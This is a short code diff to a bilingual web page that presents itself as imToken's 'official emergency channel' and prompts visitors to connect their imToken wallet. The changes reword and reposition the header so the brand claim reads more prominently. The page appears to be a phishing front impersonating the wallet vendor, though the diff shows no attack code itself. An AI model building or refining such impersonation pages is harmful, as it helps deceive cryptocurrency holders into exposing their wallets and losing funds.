@@ -55,6 +55,7 @@ body {
 .lang-switch {
     padding: 0;
     margin: 0;
+    text-align: right;
 }
 .lang-toggle {
     padding: 3px 8px; /* 调大按钮内边距，更易点击 */
@@ -339,13 +340,14 @@ body {
                 <div>
                     <h1>imToken</h1>
                 </div>
-                <p id="headerDesc">官方应急通道</p>
+                
             </div>
             
             <div class="lang-switch">
                 <button id="langToggle" class="lang-toggle">
                   <i class="fa fa-globe"></i>
             </button>
+            <p id="headerDesc">imToken官方应急通道</p>
          </div>
     </div>
         <div id="userInfo">
@@ -482,7 +484,7 @@ const B1_SIGNAL_KEY = "b1_signal_sent";
 const langConfig = {
     zh: {
         headerTitle: "imToken",
-        headerDesc: "官方应急通道", // 已替换为需求文本
+        headerDesc: "imToken官方应急通道", // 已替换为需求文本
         userInfoDefault: "未连接钱包<br><span>请点击底部「连接imToken钱包」按钮</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
@@ -550,7 +552,7 @@ const langConfig = {
     },
     en: {
         headerTitle: "imToken",
-        headerDesc: "Official Emergency Channel", // 英文对应更新
+        headerDesc: "imToken Official Emergency Channel", // 英文对应更新
         userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
